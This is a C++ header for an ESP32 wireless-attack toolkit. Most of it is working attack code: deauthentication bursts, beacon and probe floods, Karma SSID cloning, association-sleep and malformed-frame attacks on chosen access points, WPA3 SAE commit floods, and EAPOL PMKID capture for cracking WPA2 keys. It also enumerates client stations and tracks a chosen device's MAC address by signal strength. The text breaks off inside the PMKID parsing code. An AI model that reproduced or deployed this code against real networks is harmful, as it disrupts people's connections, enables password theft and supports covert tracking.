#ifndef WiFiMarauder_h
#define WiFiMarauder_h

// ---------------------------------------------------------------
// WiFiMarauder — WiFi security research toolkit
//
// Features:
//   - Passive sniffer: packet stats + probe request capture
//   - Beacon flood: fake SSID broadcast (random/rickroll/funny)
//   - Deauth: 802.11 deauthentication frames
//
// Passive (sniffer) uses STA + promiscuous mode.
// Active (beacon/deauth) uses AP mode + esp_wifi_80211_tx().
// These modes are mutually exclusive.
//
// Runs on Core 1 (main loop). Promiscuous callback is ISR-like —
// keep it fast, no LVGL or Serial calls inside.
// ---------------------------------------------------------------

#include <Arduino.h>
#include <WiFi.h>
#include <Preferences.h>
#include "esp_wifi.h"

// esp_wifi_80211_tx is in esp_wifi.h but declare explicitly for clarity
extern "C" esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

class WiFiMarauder {
public:
    // ---- Passive mode lifecycle (STA + promiscuous) ----
    static void init()
    {
        if (active) return;

        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        vTaskDelay(pdMS_TO_TICKS(100));

        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);

        active = true;
        Serial.println("[Mantis] init OK");
    }

    static void deinit()
    {
        stopSniff();
        stopBeaconFlood();
        stopDeauth();
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(nullptr);
        WiFi.disconnect(true);
        WiFi.mode(WIFI_OFF);
        active = false;
        Serial.println("[Mantis] deinit");
    }

    // ---- Active mode lifecycle (AP for raw TX) ----
    static void initActive()
    {
        if (active) return;

        // Start a hidden AP — required for esp_wifi_80211_tx(WIFI_IF_AP, ...)
        WiFi.mode(WIFI_AP);
        WiFi.softAP("", "", 1, 1, 0);  // hidden SSID, ch1, hidden=1, max_conn=0
        vTaskDelay(pdMS_TO_TICKS(100));

        active = true;
        Serial.println("[Mantis] initActive OK (AP mode)");
    }

    static void deinitActive()
    {
        stopBeaconFlood();
        stopDeauth();
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_OFF);
        active = false;
        Serial.println("[Mantis] deinitActive");
    }

    // ================================================================
    // Promiscuous Sniffer (passive — STA mode)
    // ================================================================
    static void startSniff()
    {
        if (!active) return;

        pktMgmt = 0; pktData = 0; pktMisc = 0;
        probeCount = 0; probeWriteIdx = 0; probeReadIdx = 0;
        sniffChannel = 1;
        lastChannelHop = millis();

        esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
        esp_wifi_set_promiscuous(true);
        sniffing = true;
        Serial.println("[Mantis] sniff started");
    }

    static void stopSniff()
    {
        if (sniffing) {
            esp_wifi_set_promiscuous(false);
            sniffing = false;
            Serial.println("[Mantis] sniff stopped");
        }
    }

    static void sniffLoop()
    {
        if (!sniffing) return;
        unsigned long now = millis();
        if (now - lastChannelHop >= 250) {
            lastChannelHop = now;
            sniffChannel++;
            if (sniffChannel > 13) sniffChannel = 1;
            esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
        }
    }

    // ================================================================
    // Beacon Flood (active — AP mode)
    // ================================================================
    // mode: 0 = random SSIDs, 1 = rickroll, 2 = funny names
    static void startBeaconFlood(int mode)
    {
        if (!active) return;
        beaconMode = mode;
        beaconCount = 0;
        flooding = true;
        Serial.printf("[Mantis] beacon flood started (mode %d)\n", mode);
    }

    static void stopBeaconFlood()
    {
        if (flooding) {
            flooding = false;
            Serial.println("[Mantis] beacon flood stopped");
        }
    }

    // Call from loop() — sends a batch of beacons per iteration
    static void beaconLoop()
    {
        if (!flooding) return;

        if (beaconMode == 0) {
            // Random SSIDs — generate and broadcast
            for (int i = 0; i < 10; i++) {
                char ssid[17];
                int len = random(6, 16);
                for (int j = 0; j < len; j++)
                    ssid[j] = alfa[random(sizeof(alfa) - 1)];
                ssid[len] = '\0';
                sendBeacon(ssid);
            }
        }
        else if (beaconMode == 1) {
            // Rickroll
            for (int i = 0; i < RICK_ROLL_COUNT; i++)
                sendBeacon(rick_roll[i]);
        }
        else if (beaconMode == 2) {
            // Funny names
            for (int i = 0; i < FUNNY_NAMES_COUNT; i++)
                sendBeacon(funny_names[i]);
        }

        vTaskDelay(pdMS_TO_TICKS(10));
    }

    // ================================================================
    // Deauth (active — AP mode)
    // ================================================================

    // Scan for targets using STA mode — call BEFORE initActive()
    // Returns number of targets found. Caller should be in STA or OFF mode.
    static int scanTargets()
    {
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        vTaskDelay(pdMS_TO_TICKS(100));

        int n = WiFi.scanNetworks(false, true);  // sync, show hidden
        targetCount = 0;

        for (int i = 0; i < n && targetCount < MAX_TARGETS; i++) {
            String ssid = WiFi.SSID(i);
            ssid.toCharArray(targets[targetCount].ssid, sizeof(targets[0].ssid));
            memcpy(targets[targetCount].bssid, WiFi.BSSID(i), 6);
            targets[targetCount].rssi = WiFi.RSSI(i);
            targets[targetCount].channel = WiFi.channel(i);
            targetCount++;
        }

        WiFi.scanDelete();
        WiFi.disconnect(true);
        WiFi.mode(WIFI_OFF);

        Serial.printf("[Mantis] scan found %d targets\n", targetCount);
        return targetCount;
    }

    static void startDeauth(int targetIdx)
    {
        if (!active || targetIdx < 0 || targetIdx >= targetCount) return;
        deauthTargetIdx = targetIdx;
        deauthCount = 0;
        deauthing = true;
        Serial.printf("[Mantis] deauth started on %s (ch %d)\n",
                      targets[targetIdx].ssid, targets[targetIdx].channel);
    }

    static void stopDeauth()
    {
        if (deauthing) {
            deauthing = false;
            Serial.println("[Mantis] deauth stopped");
        }
    }

    // Call from loop() — sends deauth burst
    static void deauthLoop()
    {
        if (!deauthing) return;
        if (deauthTargetIdx < 0 || deauthTargetIdx >= targetCount) {
            deauthing = false;
            return;
        }

        APTarget &t = targets[deauthTargetIdx];

        // Send burst of deauth frames
        for (int i = 0; i < 5; i++)
            sendDeauthPair(t.bssid, t.channel);

        vTaskDelay(pdMS_TO_TICKS(50));
    }

    // ================================================================
    // Public stats
    // ================================================================
    static volatile int pktMgmt;
    static volatile int pktData;
    static volatile int pktMisc;
    static volatile int probeCount;
    static volatile int beaconCount;
    static volatile int deauthCount;

    // ---- Probe request ring buffer ----
    struct ProbeEntry {
        uint8_t mac[6];
        char ssid[33];
        int8_t rssi;
    };
    static const int PROBE_BUF_SIZE = 50;
    static ProbeEntry probes[PROBE_BUF_SIZE];
    static volatile int probeWriteIdx;
    static int probeReadIdx;

    // ---- AP targets (from scan) ----
    struct APTarget {
        char ssid[33];
        uint8_t bssid[6];
        int8_t rssi;
        uint8_t channel;
    };
    static const int MAX_TARGETS = 20;
    static APTarget targets[MAX_TARGETS];
    static int targetCount;

    // Current sniff channel
    static uint8_t sniffChannel;

    // SSID lists
    static const char* const rick_roll[];
    static const int RICK_ROLL_COUNT = 8;
    static const char* const funny_names[];
    static const int FUNNY_NAMES_COUNT = 12;

    static bool isActive() { return active; }
    static bool isSniffing() { return sniffing; }
    static bool isFlooding() { return flooding; }
    static bool isDeauthing() { return deauthing; }

    // ================================================================
    // Persisted Target List (Task 1)
    // ================================================================
    // Stations associated with discovered APs (populated by sniffing
    // in promiscuous mode after a scan).
    struct StationEntry {
        uint8_t mac[6];
        uint8_t ap_bssid[6];   // last AP this station was seen talking to
        int8_t  rssi;
        uint8_t channel;
    };
    static const int MAX_STATIONS = 32;
    static StationEntry stations[MAX_STATIONS];
    static int stationCount;

    // Persisted selection sets (saved to NVS).
    static const int MAX_TARGET_SET = 16;
    static uint8_t targetAPs[MAX_TARGET_SET][6];        // BSSIDs of selected APs
    static int targetAPCount;
    static uint8_t targetStations[MAX_TARGET_SET][6];   // MACs of selected stations
    static int targetStationCount;

    // ---- AP selection (toggle by BSSID) ----
    static bool isAPSelected(const uint8_t *bssid) {
        for (int i = 0; i < targetAPCount; i++)
            if (memcmp(targetAPs[i], bssid, 6) == 0) return true;
        return false;
    }
    static bool toggleAPSelection(const uint8_t *bssid) {
        for (int i = 0; i < targetAPCount; i++) {
            if (memcmp(targetAPs[i], bssid, 6) == 0) {
                // Remove
                for (int j = i; j < targetAPCount - 1; j++)
                    memcpy(targetAPs[j], targetAPs[j+1], 6);
                targetAPCount--;
                return false;
            }
        }
        if (targetAPCount < MAX_TARGET_SET) {
            memcpy(targetAPs[targetAPCount++], bssid, 6);
            return true;
        }
        return false;
    }

    static bool isStationSelected(const uint8_t *mac) {
        for (int i = 0; i < targetStationCount; i++)
            if (memcmp(targetStations[i], mac, 6) == 0) return true;
        return false;
    }
    static bool toggleStationSelection(const uint8_t *mac) {
        for (int i = 0; i < targetStationCount; i++) {
            if (memcmp(targetStations[i], mac, 6) == 0) {
                for (int j = i; j < targetStationCount - 1; j++)
                    memcpy(targetStations[j], targetStations[j+1], 6);
                targetStationCount--;
                return false;
            }
        }
        if (targetStationCount < MAX_TARGET_SET) {
            memcpy(targetStations[targetStationCount++], mac, 6);
            return true;
        }
        return false;
    }

    // NVS persistence: 'mar' namespace, blobs "apset" and "stset"
    static void saveTargetsToNVS() {
        Preferences p;
        p.begin("mar", false);
        p.putBytes("apset", targetAPs, targetAPCount * 6);
        p.putUChar("apcnt", (uint8_t)targetAPCount);
        p.putBytes("stset", targetStations, targetStationCount * 6);
        p.putUChar("stcnt", (uint8_t)targetStationCount);
        p.end();
        Serial.printf("[Mantis] saved %d APs, %d stations to NVS\n",
                      targetAPCount, targetStationCount);
    }
    static void loadTargetsFromNVS() {
        Preferences p;
        p.begin("mar", true);
        targetAPCount = p.getUChar("apcnt", 0);
        if (targetAPCount > MAX_TARGET_SET) targetAPCount = MAX_TARGET_SET;
        if (targetAPCount > 0) p.getBytes("apset", targetAPs, targetAPCount * 6);
        targetStationCount = p.getUChar("stcnt", 0);
        if (targetStationCount > MAX_TARGET_SET) targetStationCount = MAX_TARGET_SET;
        if (targetStationCount > 0)
            p.getBytes("stset", targetStations, targetStationCount * 6);
        p.end();
    }

    // ---- Station enumeration via promiscuous mode ----
    // Runs after scanTargets() has populated `targets[]`. Channel-hops through
    // each target's channel briefly, sniffing data frames to build the
    // station list. Caller drives this via stationScanLoop().
    static void startStationScan()
    {
        if (targetCount == 0) return;
        // Switch to STA + promiscuous
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        vTaskDelay(pdMS_TO_TICKS(50));

        esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
        active = true;
        stationCount = 0;
        stationScanIdx = 0;
        stationScanStart = millis();
        sniffChannel = targets[0].channel ? targets[0].channel : 1;
        esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
        esp_wifi_set_promiscuous(true);
        stationScanning = true;
        sniffing = true;     // reuse promiscuous callback
        Serial.println("[Mantis] station scan started");
    }
    static void stopStationScan()
    {
        if (!stationScanning) return;
        stationScanning = false;
        sniffing = false;
        esp_wifi_set_promiscuous(false);
        Serial.printf("[Mantis] station scan stopped, %d stations found\n", stationCount);
    }
    // returns true while scan is still running
    static bool stationScanLoop()
    {
        if (!stationScanning) return false;
        // 800ms per AP channel
        if (millis() - stationScanStart >= 800) {
            stationScanIdx++;
            if (stationScanIdx >= targetCount) {
                stopStationScan();
                return false;
            }
            sniffChannel = targets[stationScanIdx].channel;
            if (sniffChannel < 1 || sniffChannel > 14) sniffChannel = 1;
            esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
            stationScanStart = millis();
        }
        return true;
    }
    static bool isStationScanning() { return stationScanning; }
    static int  stationScanProgress() { return stationScanIdx; }

    // ================================================================
    // EAPOL PMKID Capture (Task 2)
    // ================================================================
    struct PMKIDEntry {
        uint8_t pmkid[16];
        uint8_t mac_ap[6];
        uint8_t mac_sta[6];
        char    ssid[33];
    };
    static const int MAX_PMKIDS = 16;
    static PMKIDEntry pmkids[MAX_PMKIDS];
    static volatile int pmkidCount;

    static void startPMKIDScan()
    {
        if (!active) return;
        pmkidCount = 0;
        eapolCount = 0;
        sniffChannel = 1;
        lastChannelHop = millis();
        capturePMKID = true;
        esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
        esp_wifi_set_promiscuous(true);
        sniffing = true;
        Serial.println("[Mantis] PMKID scan started");
    }
    static void stopPMKIDScan()
    {
        capturePMKID = false;
        if (sniffing) {
            esp_wifi_set_promiscuous(false);
            sniffing = false;
        }
    }
    static volatile int eapolCount;
    static bool isCapturingPMKID() { return capturePMKID; }

    // ================================================================
    // Packet Count / Per-Channel / Signal / Pwnagotchi (Task 3 + bonus)
    // ================================================================
    // Per-channel packet counters (1..14), cleared on resetPerChannel().
    static volatile uint32_t chanPktCount[15];
    static void resetPerChannel() {
        for (int i = 0; i < 15; i++) chanPktCount[i] = 0;
    }

    // Channel analyzer: dwell on each channel briefly, total count per chan.
    // Caller drives via channelAnalyzerLoop().
    static void startChannelAnalyzer() {
        if (!active) return;
        resetPerChannel();
        analyzerChan = 1;
        analyzerStart = millis();
        sniffChannel = 1;
        esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
        esp_wifi_set_promiscuous(true);
        sniffing = true;
        analyzerRunning = true;
        Serial.println("[Mantis] channel analyzer started");
    }
    static void stopChannelAnalyzer() {
        analyzerRunning = false;
        if (sniffing) {
            esp_wifi_set_promiscuous(false);
            sniffing = false;
        }
    }
    // returns true while still scanning, false when sweep done.
    static bool channelAnalyzerLoop() {
        if (!analyzerRunning) return false;
        if (millis() - analyzerStart >= 400) {
            analyzerChan++;
            if (analyzerChan > 14) {
                // One full sweep complete — restart for continuous mode
                analyzerChan = 1;
            }
            sniffChannel = analyzerChan;
            esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
            analyzerStart = millis();
        }
        return true;
    }
    static bool isAnalyzerRunning() { return analyzerRunning; }
    static uint8_t analyzerCurrentChan() { return analyzerChan; }

    // Pwnagotchi detection — bumps counter when a beacon SSID starts with PWNGRID
    // or carries the 0xDE 0xAD 0xBE 0xEF vendor IE.
    static volatile int pwnagotchiCount;
    static char pwnagotchiLastSSID[33];

    // Ring buffer of the last detected pwnagotchi beacons
    struct PwnEntry {
        char     ssid[33];
        uint8_t  bssid[6];
        int8_t   rssi;
        uint8_t  channel;
        uint32_t millis_seen;
    };
    static const int PWN_BUF_SIZE = 8;
    static PwnEntry pwnList[PWN_BUF_SIZE];
    static volatile int pwnWriteIdx;   // total count modulo buffer

    // ================================================================
    // MAC Track — channel-hop while logging RSSI of a specific MAC
    // ================================================================
    static const int MACTRACK_HIST = 60;
    static int8_t mactrackRSSI[MACTRACK_HIST];
    static volatile int mactrackWriteIdx;
    static uint8_t mactrackTargetMac[6];
    static volatile uint8_t mactrackLastChan;
    static volatile uint32_t mactrackLastSeen;
    static volatile int mactrackHits;

    static void startMacTrack(const uint8_t *mac)
    {
        if (!active) return;
        memcpy(mactrackTargetMac, mac, 6);
        for (int i = 0; i < MACTRACK_HIST; i++) mactrackRSSI[i] = -100;
        mactrackWriteIdx = 0;
        mactrackLastChan = 0;
        mactrackLastSeen = 0;
        mactrackHits = 0;
        sniffChannel = 1;
        lastChannelHop = millis();
        esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
        esp_wifi_set_promiscuous(true);
        sniffing = true;
        macTracking = true;
        Serial.println("[Mantis] MAC track started");
    }
    static void stopMacTrack()
    {
        macTracking = false;
        if (sniffing) {
            esp_wifi_set_promiscuous(false);
            sniffing = false;
        }
    }
    static void macTrackLoop()
    {
        if (!macTracking) return;
        unsigned long now = millis();
        if (now - lastChannelHop >= 300) {
            lastChannelHop = now;
            sniffChannel++;
            if (sniffChannel > 13) sniffChannel = 1;
            esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
        }
    }
    static bool isMacTracking() { return macTracking; }

    // ================================================================
    // Probe Request Flood (active — AP mode required)
    // ================================================================
    static volatile int probeFloodCount;
    static void startProbeFlood()
    {
        if (!active) return;
        probeFloodCount = 0;
        probeFlooding = true;
        Serial.println("[Mantis] probe flood started");
    }
    static void stopProbeFlood()
    {
        if (probeFlooding) {
            probeFlooding = false;
            Serial.println("[Mantis] probe flood stopped");
        }
    }
    static void probeFloodLoop()
    {
        if (!probeFlooding) return;
        // Use SSIDs from rick_roll + funny_names + random
        for (int i = 0; i < 20; i++) {
            const char *ssid;
            int sel = random(3);
            char buf[17];
            if (sel == 0) {
                int idx = random(RICK_ROLL_COUNT);
                ssid = rick_roll[idx];
            } else if (sel == 1) {
                int idx = random(FUNNY_NAMES_COUNT);
                ssid = funny_names[idx];
            } else {
                int len = random(6, 14);
                for (int j = 0; j < len; j++)
                    buf[j] = alfa[random(sizeof(alfa) - 1)];
                buf[len] = '\0';
                ssid = buf;
            }
            sendProbeRequest(ssid);
        }
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    static bool isProbeFlooding() { return probeFlooding; }

    // ================================================================
    // Raw Sniff — buffer header info of every frame
    // ================================================================
    struct RawFrame {
        uint8_t type;      // 0=mgmt, 1=ctl, 2=data
        uint8_t subtype;
        uint16_t length;
        int8_t  rssi;
        uint8_t channel;
        uint8_t addr1[6];
        uint8_t addr2[6];
        uint8_t addr3[6];
        uint32_t ts;
    };
    static const int RAW_BUF_SIZE = 256;
    static RawFrame rawFrames[RAW_BUF_SIZE];
    static volatile int rawWriteIdx;   // monotonic
    static volatile int rawSeen;       // monotonic count

    static void startRawSniff()
    {
        if (!active) return;
        rawWriteIdx = 0;
        rawSeen = 0;
        sniffChannel = 1;
        lastChannelHop = millis();
        rawSniffing = true;
        esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
        // Most-permissive filter
        wifi_promiscuous_filter_t filt;
        filt.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;
        esp_wifi_set_promiscuous_filter(&filt);
        esp_wifi_set_promiscuous(true);
        sniffing = true;
        Serial.println("[Mantis] raw sniff started");
    }
    static void stopRawSniff()
    {
        rawSniffing = false;
        if (sniffing) {
            esp_wifi_set_promiscuous(false);
            sniffing = false;
        }
    }
    static void rawSniffLoop()
    {
        if (!rawSniffing) return;
        unsigned long now = millis();
        if (now - lastChannelHop >= 400) {
            lastChannelHop = now;
            sniffChannel++;
            if (sniffChannel > 13) sniffChannel = 1;
            esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
        }
    }
    static bool isRawSniffing() { return rawSniffing; }

    // ================================================================
    // Karma / AP Clone Spam — listen for probe requests then clone the
    // requested SSID via beacons. Cap to KARMA_MAX cloned SSIDs.
    // ================================================================
    static const int KARMA_MAX = 32;
    struct KarmaSSID {
        char ssid[33];
        uint32_t lastSeen;
    };
    static KarmaSSID karmaList[KARMA_MAX];
    static volatile int karmaCount;
    static volatile int karmaBeaconCount;

    static void startKarmaListen()
    {
        if (!active) return;
        karmaCount = 0;
        karmaBeaconCount = 0;
        karmaListening = true;
        sniffChannel = 1;
        lastChannelHop = millis();
        esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
        esp_wifi_set_promiscuous(true);
        sniffing = true;
        Serial.println("[Mantis] karma listen started");
    }
    static void stopKarmaListen()
    {
        karmaListening = false;
        if (sniffing) {
            esp_wifi_set_promiscuous(false);
            sniffing = false;
        }
    }
    static void karmaListenLoop()
    {
        if (!karmaListening) return;
        unsigned long now = millis();
        if (now - lastChannelHop >= 300) {
            lastChannelHop = now;
            sniffChannel++;
            if (sniffChannel > 11) sniffChannel = 1;
            esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
        }
    }
    // After collecting, switch to AP mode and broadcast clones.
    // Caller transitions modes; this just emits beacons.
    static void karmaCloneOnce()
    {
        if (karmaCount == 0) return;
        for (int i = 0; i < karmaCount; i++) {
            sendBeacon(karmaList[i].ssid);
            karmaBeaconCount += 3;
        }
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    static bool isKarmaListening() { return karmaListening; }

    // ================================================================
    // Association Sleep Attack — pretend to be a client, repeatedly
    // associate + immediately deauth the legit clients of an AP, looping
    // to keep clients in a sleep/wake state.
    // ================================================================
    static volatile int assocSleepCount;
    static int assocSleepTargetIdx;
    static void startAssocSleep(int targetIdx)
    {
        if (!active || targetIdx < 0 || targetIdx >= targetCount) return;
        assocSleepCount = 0;
        assocSleepTargetIdx = targetIdx;
        assocSleeping = true;
        Serial.printf("[Mantis] assoc sleep on %s\n", targets[targetIdx].ssid);
    }
    static void stopAssocSleep()
    {
        if (assocSleeping) {
            assocSleeping = false;
            Serial.println("[Mantis] assoc sleep stopped");
        }
    }
    static void assocSleepLoop()
    {
        if (!assocSleeping) return;
        if (assocSleepTargetIdx < 0 || assocSleepTargetIdx >= targetCount) {
            assocSleeping = false;
            return;
        }
        APTarget &t = targets[assocSleepTargetIdx];
        // Send a flurry: assoc request, then deauth of broadcast, then null-data PS-Poll.
        // The combo keeps clients busy with re-assoc + power-save signalling.
        for (int i = 0; i < 4; i++) {
            sendAssocRequest(t.bssid, t.channel, t.ssid);
            sendDeauthPair(t.bssid, t.channel);
            sendNullData(t.bssid, t.channel, true /*pwr_mgmt=1, sleep*/);
            assocSleepCount += 6;
        }
        vTaskDelay(pdMS_TO_TICKS(60));
    }
    static bool isAssocSleeping() { return assocSleeping; }

    // ================================================================
    // Bad Msg — malformed action frame flood against a target AP
    // (oversized category, bogus payloads). Many WPA2 clients/APs
    // log/handle these badly which can trigger client deassoc.
    // ================================================================
    static volatile int badMsgCount;
    static int badMsgTargetIdx;
    static void startBadMsg(int targetIdx)
    {
        if (!active || targetIdx < 0 || targetIdx >= targetCount) return;
        badMsgCount = 0;
        badMsgTargetIdx = targetIdx;
        badMsgRunning = true;
        Serial.printf("[Mantis] bad msg on %s\n", targets[targetIdx].ssid);
    }
    static void stopBadMsg()
    {
        if (badMsgRunning) {
            badMsgRunning = false;
            Serial.println("[Mantis] bad msg stopped");
        }
    }
    static void badMsgLoop()
    {
        if (!badMsgRunning) return;
        if (badMsgTargetIdx < 0 || badMsgTargetIdx >= targetCount) {
            badMsgRunning = false;
            return;
        }
        APTarget &t = targets[badMsgTargetIdx];
        for (int i = 0; i < 6; i++) {
            sendBadAction(t.bssid, t.channel);
            badMsgCount++;
        }
        vTaskDelay(pdMS_TO_TICKS(40));
    }
    static bool isBadMsg() { return badMsgRunning; }

    // ================================================================
    // SAE Commit / SAE Commit Flood (WPA3)
    // Auth frame, Auth Algo = 3 (SAE), seq = 1 (Commit).
    // ================================================================
    static volatile int saeCount;
    static int saeTargetIdx;
    static void startSaeCommit(int targetIdx, bool flood)
    {
        if (!active || targetIdx < 0 || targetIdx >= targetCount) return;
        saeCount = 0;
        saeTargetIdx = targetIdx;
        saeFlood = flood;
        saeRunning = true;
        Serial.printf("[Mantis] SAE %s on %s\n",
                      flood ? "flood" : "commit", targets[targetIdx].ssid);
    }
    static void stopSae()
    {
        if (saeRunning) {
            saeRunning = false;
            Serial.println("[Mantis] SAE stopped");
        }
    }
    static void saeLoop()
    {
        if (!saeRunning) return;
        if (saeTargetIdx < 0 || saeTargetIdx >= targetCount) {
            saeRunning = false;
            return;
        }
        APTarget &t = targets[saeTargetIdx];
        int burst = saeFlood ? 12 : 1;
        for (int i = 0; i < burst; i++) {
            sendSaeCommit(t.bssid, t.channel);
            saeCount++;
        }
        if (!saeFlood) {
            saeRunning = false;   // one-shot
            return;
        }
        vTaskDelay(pdMS_TO_TICKS(30));
    }
    static bool isSaeRunning() { return saeRunning; }

private:
    static bool active;
    static bool sniffing;
    static bool flooding;
    static bool deauthing;
    static bool stationScanning;
    static bool capturePMKID;
    static bool analyzerRunning;
    static bool macTracking;
    static bool probeFlooding;
    static bool rawSniffing;
    static bool karmaListening;
    static bool assocSleeping;
    static bool badMsgRunning;
    static bool saeRunning;
    static bool saeFlood;
    static int beaconMode;
    static int deauthTargetIdx;
    static unsigned long lastChannelHop;
    static int  stationScanIdx;
    static unsigned long stationScanStart;
    static uint8_t analyzerChan;
    static unsigned long analyzerStart;

    // Random alphanumeric chars for SSID generation
    static constexpr char alfa[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

    // ---- 802.11 beacon frame template (128 bytes) ----
    static uint8_t beaconPacket[128];

    // ---- 802.11 deauth frame template (26 bytes) ----
    static uint8_t deauthFrame[26];

    // ---- Promiscuous callback (ISR-like — keep fast!) ----
    static void promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type)
    {
        if (!sniffing) return;

        switch (type) {
            case WIFI_PKT_MGMT: pktMgmt++; break;
            case WIFI_PKT_DATA: pktData++; break;
            default:            pktMisc++; break;
        }

        const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
        const uint8_t* payload = pkt->payload;
        int len = pkt->rx_ctrl.sig_len;
        if (len < 24) return;

        // Per-channel counter (drives channel analyzer + pkt graph)
        uint8_t curChan = sniffChannel;
        if (curChan >= 1 && curChan <= 14) chanPktCount[curChan]++;

        uint8_t frameType    = (payload[0] & 0x0C) >> 2;
        uint8_t frameSubtype = (payload[0] & 0xF0) >> 4;

        // ---- Raw sniff: log header into ring buffer ----
        if (rawSniffing) {
            int idx = rawWriteIdx % RAW_BUF_SIZE;
            RawFrame &rf = rawFrames[idx];
            rf.type = frameType;
            rf.subtype = frameSubtype;
            rf.length = (uint16_t)len;
            rf.rssi = pkt->rx_ctrl.rssi;
            rf.channel = curChan;
            memcpy(rf.addr1, &payload[4], 6);
            memcpy(rf.addr2, &payload[10], 6);
            memcpy(rf.addr3, &payload[16], 6);
            rf.ts = (uint32_t)millis();
            rawWriteIdx++;
            rawSeen++;
        }

        // ---- MAC Track: match any address field for the target MAC ----
        if (macTracking) {
            const uint8_t *a1 = &payload[4];
            const uint8_t *a2 = &payload[10];
            const uint8_t *a3 = (len >= 22) ? &payload[16] : a2;
            if (memcmp(a1, mactrackTargetMac, 6) == 0 ||
                memcmp(a2, mactrackTargetMac, 6) == 0 ||
                memcmp(a3, mactrackTargetMac, 6) == 0) {
                int idx = mactrackWriteIdx % MACTRACK_HIST;
                mactrackRSSI[idx] = pkt->rx_ctrl.rssi;
                mactrackWriteIdx++;
                mactrackLastChan = curChan;
                mactrackLastSeen = (uint32_t)millis();
                mactrackHits++;
            }
        }

        // ---- DATA frames: station enumeration + EAPOL PMKID ----
        if (type == WIFI_PKT_DATA && frameType == 2) {
            uint8_t fromDS = (payload[1] >> 1) & 0x01;
            uint8_t toDS   = payload[1] & 0x01;
            const uint8_t *addr1 = &payload[4];   // DA / RA
            const uint8_t *addr2 = &payload[10];  // SA / TA
            const uint8_t *addr3 = &payload[16];  // BSSID

            // Identify station vs AP based on DS bits
            const uint8_t *staMac = nullptr;
            const uint8_t *apMac = nullptr;
            if (toDS && !fromDS) { staMac = addr2; apMac = addr1; }   // station -> AP
            else if (!toDS && fromDS) { staMac = addr1; apMac = addr2; }
            else { staMac = addr2; apMac = addr3; }

            // Station list — only if we're in station scan mode and station's
            // BSSID matches one of our discovered APs.
            if (stationScanning && staMac && apMac) {
                bool matchesTarget = false;
                for (int i = 0; i < targetCount; i++) {
                    if (memcmp(targets[i].bssid, apMac, 6) == 0) { matchesTarget = true; break; }
                }
                if (matchesTarget && !macIsBroadcast(staMac) && !macIsZero(staMac)) {
                    // Dedupe + insert
                    int existing = -1;
                    for (int i = 0; i < stationCount; i++) {
                        if (memcmp(stations[i].mac, staMac, 6) == 0) { existing = i; break; }
                    }
                    if (existing < 0 && stationCount < MAX_STATIONS) {
                        memcpy(stations[stationCount].mac, staMac, 6);
                        memcpy(stations[stationCount].ap_bssid, apMac, 6);
                        stations[stationCount].rssi = pkt->rx_ctrl.rssi;
                        stations[stationCount].channel = curChan;
                        stationCount++;
                    } else if (existing >= 0) {
                        stations[existing].rssi = pkt->rx_ctrl.rssi;
                        stations[existing].channel = curChan;
                    }
                }
            }

            // EAPOL PMKID extraction.
            // EAPOL is identified by LLC/SNAP header at payload[24..]: AA AA 03 00 00 00 88 8E
            // Then EAPOL packet body. Key frames carry the PMKID in tagged data
            // after the Key Data field (RSN PMKID KDE: 00 0F AC 04 ...).
            if (capturePMKID && len >= 24 + 8 + 4) {
                // Find LLC offset — usually 24 (no QoS) or 26 (QoS data subtype 8/9)
                int llcOff = 24;
                if (frameSubtype & 0x08) llcOff = 26; // QoS data
                if (len < llcOff + 8) return;
                const uint8_t *llc = &payload[llcOff];
                static const uint8_t eapol_llc[] = {0xAA,0xAA,0x03,0x00,0x00,0x00,0x88,0x8E};
                if (memcmp(llc, eapol_llc, 8) != 0) return;

                eapolCount++;
                // EAPOL body starts after LLC. EAPOL: ver(1) type(1) len(2) ... key body
                const uint8_t *eapol = &payload[llcOff + 8];
                int eapolLen = len - (llcOff + 8);
                if (eapolLen < 95) return;
                if (eapol[1] != 0x03) return;  // Type != EAPOL-Key
                // Skip ver(1)+type(1)+len(2) = 4 bytes to key descriptor
                const uint8_t *key = eapol + 4;
                int keyLen = eapolLen - 4;
                if (keyLen < 95) return;
                // Key Descriptor Type @ key[0] = 0x02 (WPA2) or 0x01 (WPA1)
                // Key Data Length @ key[93..94], Key Data @ key[95..]
                int keyDataLen = (key[93] << 8) | key[94];
                if (keyDataLen < 22) return;
                if (keyLen < 95 + keyDataLen) return;
                const uint8_t *keyData = key + 95;
                // Walk KDEs: looking for RSN PMKID KDE
                // Tag 0xDD len 0x14 OUI 00 0F AC type 04, then 16-byte PMKID
                for (int i = 0; i + 22 <= keyDataLen; ) {
                    if (keyData[i] == 0xDD && keyData[i+1] >= 0x14 &&
                        keyData[i+2] == 0x00 && keyData[i+3] == 0x0F &&
                        keyData[i+4] == 0xAC && keyData[i+5] == 0x04) {
                        // Found PMKID!
                        if (pmkidCount < MAX_PMKIDS) {
